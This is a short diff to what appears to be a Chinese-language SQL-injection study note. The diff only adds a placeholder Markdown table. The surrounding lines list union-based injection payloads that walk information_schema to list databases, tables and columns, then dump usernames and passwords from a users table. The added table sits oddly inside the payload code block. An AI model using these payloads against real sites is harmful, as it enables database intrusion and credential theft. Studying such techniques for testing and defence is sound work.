@@ -49,6 +49,9 @@ UNION SELECT 1,2,database() –+ 查询当前数据库
 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –+查询所有数据库
 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+ 查询表名
 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' –+ 查询列名
+|column1|column2|column3|
+|-|-|-|
+|content1|content2|content3|
 UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值
 ```
 ### 布尔注入
